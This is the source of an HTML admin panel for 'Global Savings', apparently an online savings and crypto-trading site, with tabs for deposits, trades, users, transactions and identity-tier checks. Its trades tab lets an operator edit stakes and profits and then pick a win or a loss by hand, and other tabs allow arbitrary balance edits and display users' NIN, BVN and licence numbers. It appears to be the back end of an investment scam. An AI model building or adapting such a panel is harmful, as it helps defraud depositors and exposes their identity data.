<!DOCTYPE html>
<html lang="en"><head><meta charset="UTF-8"><meta name="viewport" content="width=device-width, initial-scale=1">
<title>ADMIN PANEL - Global Savings</title>
<style>
*{box-sizing:border-box}body{margin:0;background:#08111f;color:white;font-family:Arial;padding:12px}
input,textarea,select{padding:11px;border-radius:8px;border:1px solid #28456e;background:#11264a;color:white;width:100%;margin:5px 0;font-size:13px}
.btn{padding:9px 13px;border-radius:8px;border:0;font-weight:bold;cursor:pointer;font-size:12px;margin:3px}
.btnG{background:#22c55e;color:white}.btnR{background:#ef4444;color:white}.btnB{background:#155eef;color:white}.btnY{background:#f59e0b;color:black}
.card{background:#132a48;border-radius:14px;padding:14px;margin:12px 0;border:1px solid #1e3a5f}
.tab{padding:10px 14px;background:#11264a;border-radius:10px;cursor:pointer;display:inline-block;margin:4px;font-size:12px}.tab.active{background:#22c55e;color:white;font-weight:bold}
.item{background:#0d1d38;padding:12px;border-radius:12px;margin:10px 0;border:1px solid #223a5e}
.detailBox{background:#08162e;padding:12px;border-radius:10px;margin-top:10px;border:1px solid #1a3357;display:none}
.detailBox.show{display:block}
.rowD{display:flex;justify-content:space-between;padding:7px 0;border-bottom:1px solid #1a3357;font-size:12px}
.rowD b{color:#8aa0c2;font-weight:normal}.rowD span{font-weight:bold;color:#e2e8f0}
.editGrid{display:grid;grid-template-columns:1fr 1fr;gap:8px}
.wa{background:#25D366;color:white;padding:5px 10px;border-radius:6px;text-decoration:none;font-size:11px;font-weight:bold}
</style></head><body>

<h2 style="margin:4px 0">🔐 ADMIN - admin@gmail.com</h2>
<div style="font-size:11px;color:#8aa0c2;margin-bottom:12px">WhatsApp Support: +2349134538841 | Tap user to see full info</div>

<div id="loginBox" class="card"><h3>Admin Login</h3>
<input id="email" value="admin@gmail.com" placeholder="admin@gmail.com">
<input id="pass" type="password" placeholder="Password">
<button class="btn btnB" onclick="login()">Login</button>
<div id="loginMsg" style="color:#f87171;font-size:12px;margin-top:8px"></div>
</div>

<div id="adminBox" style="display:none">
<div style="flex-wrap:wrap;display:flex">
<div class="tab active" id="tabDep" onclick="showTab('deposits')">Deposits</div>
<div class="tab" id="tabTrade" onclick="showTab('trades')">Trades - EDITABLE</div>
<div class="tab" id="tabUsers" onclick="showTab('users')">Users - Tap for Info</div>
<div class="tab" id="tabTrans" onclick="showTab('transactions')">Transactions</div>
<div class="tab" id="tabTier" onclick="showTab('tierVerifications')">Tier Verify</div>
</div>
<h3 id="title" style="margin-top:14px">Deposits</h3>
<div id="list">Loading...</div>
<button class="btn btnR" onclick="logout()" style="margin-top:16px">Logout</button>
</div>

<script type="module">
import { initializeApp } from "https://www.gstatic.com/firebasejs/10.12.5/firebase-app.js";
import { getAuth, signInWithEmailAndPassword, onAuthStateChanged, signOut } from "https://www.gstatic.com/firebasejs/10.12.5/firebase-auth.js";
import { getFirestore, collection, query, orderBy, getDocs, doc, getDoc, updateDoc, deleteDoc, addDoc, serverTimestamp } from "https://www.gstatic.com/firebasejs/10.12.5/firebase-firestore.js";
const firebaseConfig={apiKey:"AIzaSyCmRE7PK3ve9DjBGIOCcOuq_5WyfUrwM50",authDomain:"global-savings.firebaseapp.com",projectId:"global-savings",storageBucket:"global-savings.firebasestorage.app",messagingSenderId:"83435054105",appId:"1:83435054105:web:efac6cbd5a264a6892b688"};
const app=initializeApp(firebaseConfig);const auth=getAuth(app);const db=getFirestore(app);

window.login=async()=>{try{await signInWithEmailAndPassword(auth,document.getElementById("email").value.trim(),document.getElementById("pass").value);}catch(e){document.getElementById("loginMsg").textContent=e.message;}};
window.logout=async()=>{await signOut(auth);location.reload();};
onAuthStateChanged(auth,u=>{
 if(!u)return;
 if(u.email!=="admin@gmail.com" && u.email!=="emmanuelomelu@gmail.com"){document.getElementById("loginMsg").textContent="Only admin@gmail.com allowed";return;}
 document.getElementById("loginBox").style.display="none";document.getElementById("adminBox").style.display="block";loadDeposits();
});
window.showTab=(t)=>{
 document.querySelectorAll(".tab").forEach(x=>x.classList.remove("active"));
 const m={deposits:"tabDep",trades:"tabTrade",users:"tabUsers",transactions:"tabTrans",tierVerifications:"tabTier"};
 document.getElementById(m[t]).classList.add("active");
 if(t==="deposits")loadDeposits();if(t==="trades")loadTrades();if(t==="users")loadUsers();if(t==="transactions")loadTransactions();if(t==="tierVerifications")loadTier();
};

// DEPOSITS
async function loadDeposits(){
 document.getElementById("title").textContent="Deposits - Approve = Add Money";
 const snap=await getDocs(query(collection(db,"deposits"),orderBy("createdAt","desc")));
 let html="";snap.forEach(d=>{const v=d.data();html+=`<div class="item"><b>$${v.amount}</b> - ${v.username||""} - ${v.accountNumber||""}<br><span style="font-size:11px;color:#8aa0c2">UID:${v.uid}<br>Status:${v.status} ${v.finalVerdict||""}<br>${v.createdAt?.toDate?.()?.toLocaleString()||""}</span><div style="margin-top:8px"><button class="btn btnG" onclick="approveDeposit('${d.id}')">APPROVE +$${v.amount}</button><button class="btn btnR" onclick="rejectDeposit('${d.id}')">REJECTED</button><button class="btn btnB" onclick="del('deposits','${d.id}')">Delete</button></div></div>`;});
 document.getElementById("list").innerHTML=html||"No deposits";
}
window.approveDeposit=async(id)=>{
 if(!confirm("Approve this deposit? Money will go to user balance"))return;
 const dep= (await getDoc(doc(db,"deposits",id))).data();
 const uRef=doc(db,"users",dep.uid);const u=(await getDoc(uRef)).data();
 const newBal=Number(u.balance||0)+Number(dep.amount);
 await updateDoc(uRef,{balance:newBal});
 await updateDoc(doc(db,"deposits",id),{status:"completed",finalVerdict:"approve",approvedAt:serverTimestamp()});
 await addDoc(collection(db,"transactions"),{uid:dep.uid,type:"deposit_success",amount:dep.amount,description:`DEPOSIT SUCCESSFUL $${dep.amount} - 8916263377 - CONGRATULATIONS! Approved by admin`,status:"completed",createdAt:serverTimestamp()});
 alert("Approved $"+dep.amount);loadDeposits();
};
window.rejectDeposit=async(id)=>{await updateDoc(doc(db,"deposits",id),{status:"rejected",finalVerdict:"rejected"});alert("Rejected");loadDeposits();};

// USERS - TAP TO SEE FULL INFO
async function loadUsers(){
 document.getElementById("title").textContent="Users - Tap any user to see FULL signup info";
 const snap=await getDocs(collection(db,"users"));
 let html="";snap.forEach(d=>{
  const u=d.data();
  html+=`<div class="item" onclick="toggleDetail('${d.id}')" style="cursor:pointer">
  <div style="display:flex;justify-content:space-between"><div><b>${u.fullName||u.username||"No Name"}</b> - @${u.username||""}<br><span style="font-size:12px">Balance: $${Number(u.balance||0).toFixed(2)} - ${u.email||""}</span></div><div style="font-size:11px;color:#22c55e">▼ Tap to view</div></div>
  <div id="det-${d.id}" class="detailBox">
    <h4 style="margin:0 0 8px 0">📋 Full Signup Information</h4>
    <div class="rowD"><b>Full Name</b><span>${u.fullName||"-"}</span></div>
    <div class="rowD"><b>Username</b><span>${u.username||"-"}</span></div>
    <div class="rowD"><b>Email (Login)</b><span>${u.email||"-"}</span></div>
    <div class="rowD"><b>Phone Number</b><span>${u.phoneNumber||"-"}</span></div>
    <div class="rowD"><b>Country Code</b><span>${u.countryCode||"-"}</span></div>
    <div class="rowD"><b>Date of Birth</b><span>${u.dateOfBirth||"-"}</span></div>
    <div class="rowD"><b>NIN (Tier1)</b><span>${u.nin||"-"}</span></div>
    <div class="rowD"><b>BVN (Tier2)</b><span>${u.bvn||"-"} - Status: ${u.tier2Status||"not submitted"} ${u.tier2Verified?"✓ Verified":""}</span></div>
    <div class="rowD"><b>Driver License (Tier3)</b><span>${u.driversLicense||"-"} - Status: ${u.tier3Status||"not submitted"} ${u.tier3Verified?"✓ Verified":""}</span></div>
    <div class="rowD"><b>Current Balance</b><span style="color:#22c55e">$${Number(u.balance||0).toFixed(2)} REAL</span></div>
    <div class="rowD"><b>User ID</b><span style="font-size:10px">${d.id}</span></div>
    <div class="rowD"><b>Created</b><span>${u.createdAt?.toDate?.()?.toLocaleString()||"-"}</span></div>
    <div style="margin-top:10px" class="editGrid">
      <input id="bal-${d.id}" type="number" value="${u.balance||0}" placeholder="New Balance">
      <button class="btn btnB" onclick="event.stopPropagation();setBal('${d.id}')">Set Balance</button>
    </div>
    <div style="margin-top:8px;display:flex;gap:6px;flex-wrap:wrap">
      <a class="wa" href="https://wa.me/${(u.phoneNumber||'').replace('+','')}?text=Hello%20${u.username||''}" target="_blank" onclick="event.stopPropagation()">💬 WhatsApp User</a>
      <a class="wa" style="background:#155eef" href="mailto:${u.email||''}" onclick="event.stopPropagation()">📧 Email User</a>
      <button class="btn btnR" onclick="event.stopPropagation();del('users','${d.id}')">Delete User</button>
    </div>
  </div>
  </div>`;
 });
 document.getElementById("list").innerHTML=html||"No users";
}
window.toggleDetail=(id)=>{const el=document.getElementById("det-"+id);el.classList.toggle("show");};
window.setBal=async(uid)=>{const v=Number(document.getElementById("bal-"+uid).value);await updateDoc(doc(db,"users",uid),{balance:v});alert("Balance set to $"+v);loadUsers();};

// TRADES - EDITABLE STAKE, STOP LOSS, TAKE PROFIT
async function loadTrades(){
 document.getElementById("title").textContent="Trades - EDIT Amounts Then Approve/Reject";
 const snap=await getDocs(query(collection(db,"trades"),orderBy("createdAt","desc")));
 let html="";snap.forEach(d=>{
  const t=d.data();
  html+=`<div class="item">
   <div><b>${t.coin||""} - ${t.type||"SELL"} - ${t.description||t.coin||""}</b> - ${t.status||""} - ${t.finalVerdict||""}<br>
   <span style="font-size:11px;color:#8aa0c2">User: ${t.username||""} UID:${t.uid}<br>ID:${d.id}<br>Created: ${t.createdAt?.toDate?.()?.toLocaleString()||""}</span></div>
   <div style="margin-top:10px;background:#08162e;padding:10px;border-radius:10px;border:1px dashed #28456e">
     <label style="font-size:11px">🟢 STAKE AMOUNT (what they invested)</label><input id="stake-${d.id}" type="number" value="${t.amount||0}">
     <div class="editGrid">
       <div><label style="font-size:11px">🔴 STOP LOSS AMOUNT ($200)</label><input id="sl-${d.id}" type="number" value="${t.stopLossAmount||t.stopLoss||200}"></div>
       <div><label style="font-size:11px">🟢 TAKE PROFIT AMOUNT</label><input id="tp-${d.id}" type="number" value="${t.takeProfitAmount||0}"></div>
     </div>
     <div class="editGrid">
       <div><label style="font-size:11px">📈 Profit %</label><input id="pct-${d.id}" type="number" value="${t.profitPct||0}"></div>
       <div><label style="font-size:11px">🪙 Coin</label><input id="coin-${d.id}" value="${t.coin||""}"></div>
     </div>
     <label style="font-size:11px">Description (DOWN/UP)</label><input id="desc-${d.id}" value="${t.description||""}">
     <div style="display:flex;gap:6px;margin-top:8px;flex-wrap:wrap">
       <button class="btn btnB" onclick="saveTrade('${d.id}')">💾 SAVE EDITED AMOUNTS</button>
       <button class="btn btnG" onclick="approveTrade('${d.id}')">✅ APPROVE WIN - Add Stake+TP</button>
       <button class="btn btnR" onclick="rejectTrade('${d.id}')">❌ REJECTED - Only SL $</button>
       <button class="btn btnB" style="background:#334155" onclick="del('trades','${d.id}')">Delete</button>
     </div>
   </div>
  </div>`;
 });
 document.getElementById("list").innerHTML=html||"No trades";
}
window.saveTrade=async(id)=>{
 const stake=Number(document.getElementById(`stake-${id}`).value);
 const sl=Number(document.getElementById(`sl-${id}`).value);
 const tp=Number(document.getElementById(`tp-${id}`).value);
 const pct=Number(document.getElementById(`pct-${id}`).value);
 const coin=document.getElementById(`coin-${id}`).value;
 const desc=document.getElementById(`desc-${id}`).value;
 await updateDoc(doc(db,"trades",id),{amount:stake,stopLossAmount:sl,stopLoss:sl,takeProfitAmount:tp,profitPct:pct,coin:coin,description:desc,editedBy:"admin@gmail.com",editedAt:serverTimestamp()});
 alert(`Trade saved: Stake $${stake} | SL $${sl} | TP $${tp}`);
};
window.approveTrade=async(id)=>{
 if(!confirm("Approve? Stake + Take Profit will be added to user REAL balance"))return;
 const snap=await getDoc(doc(db,"trades",id));const t=snap.data();
 const total=Number(t.amount)+Number(t.takeProfitAmount||0);
 const uRef=doc(db,"users",t.uid);const u=(await getDoc(uRef)).data();
 await updateDoc(uRef,{balance:Number(u.balance||0)+total});
 await updateDoc(doc(db,"trades",id),{status:"completed",finalVerdict:"approve",approvedAt:serverTimestamp()});
 await addDoc(collection(db,"transactions"),{uid:t.uid,type:"trade_success",amount:total,description:`TRADE SUCCESSFUL ${t.coin} +${t.profitPct||0}% - Stake $${t.amount} + Profit $${t.takeProfitAmount} = $${total} - CONGRATULATIONS!`,status:"completed",tradeId:id,createdAt:serverTimestamp()});
 alert(`Approved WIN $${total} added`);loadTrades();
};
window.rejectTrade=async(id)=>{
 if(!confirm("Reject? Only Stop Loss amount will be returned to user"))return;
 const snap=await getDoc(doc(db,"trades",id));const t=snap.data();
 const sl=Number(t.stopLossAmount||0);
 const uRef=doc(db,"users",t.uid);const u=(await getDoc(uRef)).data();
 await updateDoc(uRef,{balance:Number(u.balance||0)+sl});
 await updateDoc(doc(db,"trades",id),{status:"completed",finalVerdict:"rejected",rejectedAt:serverTimestamp()});
 await addDoc(collection(db,"transactions"),{uid:t.uid,type:"trade_loss",amount:sl,description:`TRADE LOSS ${t.coin} - $${t.amount} lost - Only Stop Loss $${sl} returned - WhatsApp +2349134538841`,status:"completed",tradeId:id,createdAt:serverTimestamp()});
 alert(`Rejected - Only $${sl} returned`);loadTrades();
};

async function loadTransactions(){document.getElementById("title").textContent="Transactions - Edit/Delete";const snap=await getDocs(query(collection(db,"transactions"),orderBy("createdAt","desc")));let html="";let c=0;snap.forEach(d=>{if(c++>120)return;const v=d.data();html+=`<div class="item"><b>${v.type||""} $${v.amount||0} ${v.status||""}</b><br><span style="font-size:11px">${v.description||""}<br>UID:${v.uid} ID:${d.id}</span><div style="display:flex;gap:6px;margin-top:6px"><input id="ta-${d.id}" type="number" value="${v.amount||0}" style="width:100px"><button class="btn btnB" onclick="updTrans('${d.id}')">Save</button><button class="btn btnR" onclick="del('transactions','${d.id}')">Delete</button></div></div>`;});document.getElementById("list").innerHTML=html;}
window.updTrans=async(id)=>{const amt=Number(document.getElementById("ta-"+id).value);await updateDoc(doc(db,"transactions",id),{amount:amt});alert("Updated");};

async function loadTier(){document.getElementById("title").textContent="Tier Verifications - BVN & License";const snap=await getDocs(query(collection(db,"tierVerifications"),orderBy("createdAt","desc")));let html="";snap.forEach(d=>{const v=d.data();html+=`<div class="item"><b>Tier ${v.tier} ${v.type}</b> ${v.bvn||v.license||""}<br><span style="font-size:11px">UID:${v.uid} Email:${v.email||""} Status:${v.status}</span><div style="margin-top:6px"><button class="btn btnG" onclick="approveTier('${d.id}',${v.tier},'${v.uid}')">Approve Tier ${v.tier}</button><button class="btn btnR" onclick="del('tierVerifications','${d.id}')">Delete</button></div></div>`;});document.getElementById("list").innerHTML=html||"No verifications";}
window.approveTier=async(id,tier,uid)=>{await updateDoc(doc(db,"tierVerifications",id),{status:"approved"});if(tier==2)await updateDoc(doc(db,"users",uid),{tier2Verified:true,tier2Status:"approved"});if(tier==3)await updateDoc(doc(db,"users",uid),{tier3Verified:true,tier3Status:"approved"});alert("Tier "+tier+" approved");loadTier();};
window.del=async(col,id)=>{if(!confirm("Delete "+col+"/"+id+"?"))return;await deleteDoc(doc(db,col,id));alert("Deleted");if(col==="deposits")loadDeposits();if(col==="trades")loadTrades();if(col==="users")loadUsers();if(col==="transactions")loadTransactions();if(col==="tierVerifications")loadTier();};
</script></body></html>
